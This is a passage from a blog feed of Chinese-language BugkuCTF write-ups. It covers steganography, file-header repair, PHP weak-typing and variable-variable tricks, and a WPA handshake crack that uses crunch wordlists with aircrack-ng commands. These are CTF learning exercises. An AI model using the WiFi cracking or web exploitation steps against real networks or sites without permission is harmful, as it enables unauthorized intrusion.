src="https://img-blog.csdnimg.cn/20201114141622184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）解压后得到一张图片，查看其属性，在详细信息中发现一串base64加密的字符，解密后得到flag。<br><img src="https://img-blog.csdnimg.cn/20201114141742641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201114141801436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_004</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-004/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-004/</url>
      
        <content type="html"><![CDATA[<h2 id="猫片-安恒"><a href="#猫片-安恒" class="headerlink" title="猫片(安恒)"></a>猫片(安恒)</h2><p>（1）将下载的文件后缀名改为png（注：png正常文件头：89 50 4E 47）<br><img src="https://img-blog.csdnimg.cn/20201031123855768.png#pic_center" alt="在这里插入图片描述"><br>（2）根据提示LSB和BGR，用stegsolve工具打开，发现一张png图片<br><img src="https://img-blog.csdnimg.cn/20201031124027360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）将其保存下来，并修改后缀名为.png，但无法打开。用notepad++打开，发现文件头错误<br><img src="https://img-blog.csdnimg.cn/20201031124313322.png#pic_center" alt="在这里插入图片描述"><br>（3）将前面的ff fe删掉并保存，打开图片，是半张二维码<br><img src="https://img-blog.csdnimg.cn/2020103112441746.png#pic_center" alt="在这里插入图片描述"><br>（4）修改图片高度试试，改为和长度一样。<br><img src="https://img-blog.csdnimg.cn/2020103112542257.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031125455519.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031125506356.png#pic_center" alt="在这里插入图片描述"><br>（5）看到了完整的二维码，但和正常的有些不一样，中间的正方形应为黑色。用画图工具反色一下（新建–&gt;粘贴来源–&gt;右键–反色–&gt;裁剪）<br><img src="https://img-blog.csdnimg.cn/20201031130018412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031130038164.png#pic_center" alt="在这里插入图片描述"><br>（6）扫描器扫描，得到一个网址，是一个百度云链接<br><img src="https://img-blog.csdnimg.cn/20201031130224341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020103113034095.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）下载下来后，是一个rar压缩包，但解压时出现了问题，可以用WinRAR打开<br><img src="https://img-blog.csdnimg.cn/20201031130626811.png#pic_center" alt="在这里插入图片描述"><br>（8）不过依然得到一个flag.txt文件<br><img src="https://img-blog.csdnimg.cn/20201031130758999.png#pic_center" alt="在这里插入图片描述"><br>（9）根据hint里的提示“NTFS”,用NtfsStreamsEditor查看数据流，然后导出。<br>#flag.rar这个压缩文件一定要用winrar来解压才能找得到数据流。<br><img src="https://img-blog.csdnimg.cn/2020103122191832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（10）一个.pyc文件，放到在线工具<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><img src="https://img-blog.csdnimg.cn/20201031133154759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（11）根据这个加密脚本，再写一个解密脚本</p><pre><code>def decode():    ciphertext = [    &#39;96&#39;,    &#39;65&#39;,    &#39;93&#39;,    &#39;123&#39;,    &#39;91&#39;,    &#39;97&#39;,    &#39;22&#39;,    &#39;93&#39;,    &#39;70&#39;,    &#39;102&#39;,    &#39;94&#39;,    &#39;132&#39;,    &#39;46&#39;,    &#39;112&#39;,    &#39;64&#39;,    &#39;97&#39;,    &#39;88&#39;,    &#39;80&#39;,    &#39;82&#39;,    &#39;137&#39;,    &#39;90&#39;,    &#39;109&#39;,    &#39;99&#39;,    &#39;112&#39;]    ciphertext.reverse()    flag = &#39;&#39;    for i in range(len(ciphertext)):        if i % 2 == 0:            s = int(ciphertext[i]) - 10        else:            s = int(ciphertext[i]) + 10        s=chr(i^s)        flag += s    return flagdef main():    flag = decode()    print(flag)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>（12）用代码在线工具执行一下<a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a><br><img src="https://img-blog.csdnimg.cn/20201031133531810.png#pic_center" alt="在这里插入图片描述"></p><h2 id="多彩"><a href="#多彩" class="headerlink" title="多彩"></a>多彩</h2><p>（1）得到一张.png的图片,在notepad++里没有发现有用信息<br><img src="https://img-blog.csdnimg.cn/20201031162838777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）放到stegsolve里分析，发现了图片中隐藏的数据，是一个压缩包，将其抽取出来<br><img src="https://img-blog.csdnimg.cn/20201031163106844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）先用notepad++打开这个压缩包，删掉文件头前面的东西，然后保存<br><img src="https://img-blog.csdnimg.cn/20201031163401174.png#pic_center" alt="在这里插入图片描述"><br>（4）把后缀名改为zip，解压，但出错了，后缀名改为.rar也是这样（不执行第3步也会出错）<br><img src="https://img-blog.csdnimg.cn/20201101120011595.png#pic_center" alt="在这里插入图片描述"></p><p>（5）看了一些大佬的writeup，压缩文件是加密的，需要用到图片中的色号。但我这里直接显示出错，没让我输入密码。后面就不会做了。（嘤嘤嘤）</p><pre><code>1,27,59,11,23,7,57,1,1,76,222,1,1,50,214,6,77,50,53,214,6</code></pre><h2 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h2><p><img src="https://img-blog.csdnimg.cn/20201101114352899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（1）附件是一个音频文件，使用工具MP3Stego来对音频进行解码。将该音频文件拷贝到MP3Stego目录下，在目录栏里输入cmd打开运行窗口。输入如下命令解码</p><pre><code>Decode.exe -X -P syclovergeek sycgeek-mp3.mp3          //-P后面即为题目提示的密码</code></pre><p><img src="https://img-blog.csdnimg.cn/20201101114808149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）解码完后，在MP3Stego目录下多了一个sycgeek-mp3.mp3.txt文件，打开即可看到flag。<br><img src="https://img-blog.csdnimg.cn/20201101114920512.png#pic_center" alt="在这里插入图片描述"></p><h2 id="普通的二维码"><a href="#普通的二维码" class="headerlink" title="普通的二维码"></a>普通的二维码</h2><p>（1）下载附件，得到一张二维码，扫描后没有flag。用notepad++打开看看<br><img src="https://img-blog.csdnimg.cn/20201104224511217.png#pic_center" alt="在这里插入图片描述">（2）在最后发现一串数字，想到ASCII码，146作为八进制时对应的是f。然后把这串数字转换成对应的字符，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201104224835832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Web_001</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Web-001/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Web-001/</url>
      
        <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>直接在URL前加“view-source:”，查看源代码，发现flag</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>（1）打开网址，是计算两个数的和，但结果只能输入一位数字。<br><img src="https://img-blog.csdnimg.cn/20201031181135297.png#pic_center" alt="在这里插入图片描述">（2）查看源代码<br><img src="https://img-blog.csdnimg.cn/20201031181300527.png#pic_center" alt="在这里插入图片描述">（3）指出了字符串的最大长度为1，直接修改这个最大长度，只要改为比结果的位数大就行<br><img src="https://img-blog.csdnimg.cn/20201031181506727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4）然后计算出正确的结果就能得到flag<br><img src="https://img-blog.csdnimg.cn/20201031181616802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>用get方法输入一个参数，参数名为“what”，值为“flag”<br>?用来间隔URL和请求参数，若要输入多个参数，用&amp;间隔。<br><img src="https://img-blog.csdnimg.cn/20201031182115891.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>用post方法输入一个参数，借助hackbar工具，传一个what参数，值为flag<br><img src="https://img-blog.csdnimg.cn/20201031182732284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>（1）一串php代码<br><img src="https://img-blog.csdnimg.cn/20201031184550585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）用get方法传入一个num参数，其不能为数字，但又要等于1。这里涉及php代码弱类型比较，数字和字符混合的字符串转换为整数后只保留数字部分。所以num可以构造为1xiaosong，字符部分随便。<br><img src="https://img-blog.csdnimg.cn/20201031185112888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>#<img src="https://img-blog.csdnimg.cn/20201031185229655.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>（1）打开网址，一直是重复的页面<br><img src="https://img-blog.csdnimg.cn/20201031185735566.png#pic_center" alt="在这里插入图片描述">（2）用view-source:查看源代码，在最下面发现一串unicode编码<br><img src="https://img-blog.csdnimg.cn/20201031185849413.png#pic_center" alt="在这里插入图片描述">（3）用在线工具转为ASCII码得到flag ( <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a>)<br><img src="https://img-blog.csdnimg.cn/2020103118594657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><img src="https://img-blog.csdnimg.cn/20201031191427635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（1）根据题目的意思，将域名flag.baidu.com指向到IP地址123.206.87.240<br>windows平台在C:\Windows\System32\drivers\etc\host中最后一行加入120.24.86.145 flag.bugku.com  （这里用notepad++打开host文件，修改后保存）<br><img src="https://img-blog.csdnimg.cn/20201031192314845.png#pic_center" alt="在这里插入图片描述"></p><p>（2）修改完后，打开浏览器访问flag.baidu.com，得到flag<br><img src="https://img-blog.csdnimg.cn/20201031192355246.png#pic_center" alt="在这里插入图片描述"></p><p>#如果是linux平台，则在/etc/host中加入123.206.87.240   flag.baidu.com </p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>（1）打开网址，页面一直刷新，用burp抓包<br><img src="https://img-blog.csdnimg.cn/20201031194439430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）发送到Repeater，点击发送，每发送一次，图片都会来一次变化，这是随机的，不断地发送，在出现10.jpg的时候发现了flag<br><img src="https://img-blog.csdnimg.cn/20201031194748327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>（1）打开网址，发现一段php代码<br><img src="https://img-blog.csdnimg.cn/20201101173036596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）对代码的解释：</p><pre><code>&lt;?php  error_reporting(0);                            //关闭php错误显示include &quot;flag1.php&quot;;                           //引入flag1.php文件代码highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123;                     //通过get方式传递 args变量才能执行if里面的代码    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;    //正则表达式的意思是匹配任意[A-Z,a-z，0-9,_]的字符，就是任意大小写字母和0-9以及下划线组成        die(&quot;args error!&quot;);    &#125;    eval(&quot;var_dump($$args);&quot;);&#125;?&gt;</code></pre><p>（3）可变变量(<a href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a>)<br>#一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如： </p><pre><code>&lt;?php$a = &#39;hello&#39;;?&gt;</code></pre><p>#一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。例如：</p><pre><code>&lt;?php$$a = &#39;world&#39;;?&gt;</code></pre><p>#这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句： </p><pre><code>&lt;?phpecho &quot;$a $&#123;$a&#125;&quot;;?&gt;</code></pre><p>与以下语句输出完全相同的结果,都会输出hello world： </p><pre><code>&lt;?phpecho &quot;$a $hello&quot;;?&gt;</code></pre><p>#要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下$$a[1] 时，解析器需要知道是想要 $a[1] 作为一个变量呢，还是想要 $$a 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 ${$a[1]}，对第二种情况用 ${$a}[1]。 </p><p>#在 PHP 的函数和类的方法中，超全局变量不能用作可变变量。$this 变量也是一个特殊变量，不能被动态引用。 </p><p>（4）超全局变量是在全部作用域中始终可用的内置变量<br>这些超全局变量是：</p><pre><code>    $GLOBALS    $_SERVER    $_GET    $_POST    $_FILES    $_COOKIE    $_SESSION    $_REQUEST    $_ENV</code></pre><p>（5）所以只需给变量传入一个全局变量就可以了，将其变量名传入。构造参数：?args=GLOBALS，就能得到flag。<br><img src="https://img-blog.csdnimg.cn/20201101175938899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><img src="https://img-blog.csdnimg.cn/20201101184046587.png#pic_center" alt="在这里插入图片描述"></p><p>（1）查看网页源代码，发现一串特殊的字符<br><img src="https://img-blog.csdnimg.cn/20201101184313987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）根据题目的提示，JSFuck是用6个字符 [ ] ( ) ! +来编写JavaScript程序。将源代码中的特殊字符放到浏览器的console控制台上进行解密。粘贴到控制台后按回车即可。<br><img src="https://img-blog.csdnimg.cn/20201101184717920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（3）注意提交格式，要求大写。CTF{WHATFK}</p><p>#Jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：[ ] ( ) ! + { }  只用这些字符就能完成对任意字符串的编码。（可以在浏览器的console控制台上直接解密）</p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_003</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-003/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-003/</url>
      
        <content type="html"><![CDATA[<h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p><img src="https://img-blog.csdnimg.cn/20201030224918563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（1）用wireshark打开附件<br><img src="https://img-blog.csdnimg.cn/20201030224945875.png#pic_center" alt="在这里插入图片描述"><br>（2）WiFi连接认证的重点在WPA的四次握手包，即eapol协议的包，过滤一下：<br><img src="https://img-blog.csdnimg.cn/20201030225003978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）根据题目，需要爆破WiFi密码，使用密码生成工具crunch生成密码字典（kali自带，无需安装）这里题目提示密码为手机号，所以设置生成11位的字符，并且给出了前7位，则只剩下4位需要破解。<br><img src="https://img-blog.csdnimg.cn/20201030225045290.png#pic_center" alt="在这里插入图片描述"><br>（4）再使用软件aircrack破解WiFi密码（kali自带，无需安装），这里选择第三3个，然后开始破解，即可看到flag。<br><img src="https://img-blog.csdnimg.cn/20201030225105113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030225113875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>#字典生成工具crunch：<br>参数:  crunch<br>-t   @/,/%/^<br><br>     @插入小写字母<br>    ，插入大写字母<br>    %插入数字<br>^插入特殊符号<br>例子：<br>（1）生成11个数字组合的密码字典：</p><pre><code>crunch 11 11 0123456789 -o mypwd.txt     //第一个11代表生成的字符串最短几个字符，第二个11代表生成的字符串最长几个字符</code></pre><p>（2）生成4个数字和1391040组合的密码字典：</p><pre><code>crunch 11 11 0123456789 -t 1391040%%%% -o mypwd.txt</code></pre><p>（3）生成4个小写字母和4个数字组合的密码字典：</p><pre><code>crunch 8 8 -t @@@@%%%%  -o mypwd.txt</code></pre><p>#工具aircrack破解WiFi密码：破解WEP/WPA/WPA2加密的主流工具之一</p><pre><code>aircrack-ng -w mypwd.txt wifi.cap       //前面是密码字典的位置，后面是需要破解的握手包即.cap文件的位置，看到KEY FOUND即为找到密码</code></pre><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>（1）用notepad++打开附件，搜索flag，无果。再试试搜key，发现flag。<br><img src="https://img-blog.csdnimg.cn/20201030225632898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030225640161.png#pic_center" alt="在这里插入图片描述"></p><h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>（1）得到一张.jpg的图片，用notepad++打开，发现有两张.jpg的图片，还有一些其他的文件。放到kali中用foremost分解，foremost -t all 1.jpg<br><img src="https://img-blog.csdnimg.cn/20201030225710475.png#pic_center" alt="在这里插入图片描述"><br>（2）分解完后，在output目录下发现有一个压缩包，压缩包里面还有一张2.png图片，但解压需要密码<br><img src="https://img-blog.csdnimg.cn/20201030225727162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）查看原有图片的属性，在“详细信息”里看到备注中的一串字符<br><img src="https://img-blog.csdnimg.cn/2020103022574693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）应该被加密了，用base64解码后得到MSDS456ASD123zz<br><img src="https://img-blog.csdnimg.cn/20201030225802968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）以解码后的字符作为密码，解压压缩包，得到2.png（可将压缩包放到Windows下解压）<br><img src="https://img-blog.csdnimg.cn/2020103022581822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）用notepad++打开2.png，搜索flag或key，无果。修改图片的高度，使其和长度一样<br><img src="https://img-blog.csdnimg.cn/20201030225835951.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030225842650.png#pic_center" alt="在这里插入图片描述"><br>（7）看到了flag<br><img src="https://img-blog.csdnimg.cn/20201030225856761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><p>（1）得到一张.jpg图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030225938915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现其中还包含其他文件，放到kali中用foremost分解。得到一个zip文件夹，里面有多个文件<br><img src="https://img-blog.csdnimg.cn/20201030225959464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）用notepad++依次打开8，88，888，8888，88888，888888，8888888，88888888<br>发现88，888，8888都是jpg文件，其他的则是bmp文件（文件头42 4D 76）。修改各个文件的后缀名<br><img src="https://img-blog.csdnimg.cn/20201030230022380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发现88.jpg有一个二维码，用扫描器得到bilibili<br><img src="https://img-blog.csdnimg.cn/20201030230047182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）依次查看各图片的属性，在888.jpg中发现base64密文，解密后得到silisili<br><img src="https://img-blog.csdnimg.cn/20201030230105655.png#pic_center" alt="在这里插入图片描述"><br>（6）根据提示，按顺序分析8888.jpg，在notepad++里发现还有一个压缩包<br><img src="https://img-blog.csdnimg.cn/20201030230123626.png#pic_center" alt="在这里插入图片描述"><br>（7）将8888.jpg放到kali中用foremost分解，得到一张二维码图片，扫描后的到panama<br><img src="https://img-blog.csdnimg.cn/20201030230146958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>8）按顺序排列，flag为flag{bilibili_silisili_panama}，注意格式，中间记得要有下划线</p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_002</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-002/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-002/</url>
      
